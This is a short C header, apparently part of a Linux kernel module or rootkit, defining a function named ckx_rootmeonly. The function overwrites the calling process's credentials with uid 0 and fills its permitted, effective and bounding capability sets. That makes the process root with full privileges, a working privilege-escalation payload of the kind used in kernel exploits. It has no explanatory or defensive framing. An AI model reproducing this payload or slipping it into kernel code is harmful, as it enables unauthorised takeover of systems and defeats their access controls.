#ifndef _CKX_ROOTONLY_
#define _CKX_ROOTONLY_

void ckx_rootmeonly(void)
{
    struct cred *mycred = current_cred();

    printk("[@]the current uid is %d\n", mycred->uid);

    kuid_t rootid;
    rootid.val = 0;

    // kuid_t rootid = KUIDT_INIT(0);
    mycred = prepare_creds();

    mycred->uid = rootid;

    mycred->cap_permitted.cap[0] = 0xffffffff;
    mycred->cap_permitted.cap[1] = 0x3f;
    mycred->cap_effective.cap[0] = 0xffffffff;
    mycred->cap_effective.cap[1] = 0x3f;
    mycred->cap_bset.cap[0] = 0xffffffff;
    mycred->cap_bset.cap[1] = 0x3f;


    commit_creds(mycred);

    printk("[@]now current uid is %d\n", mycred->uid);
}
#endif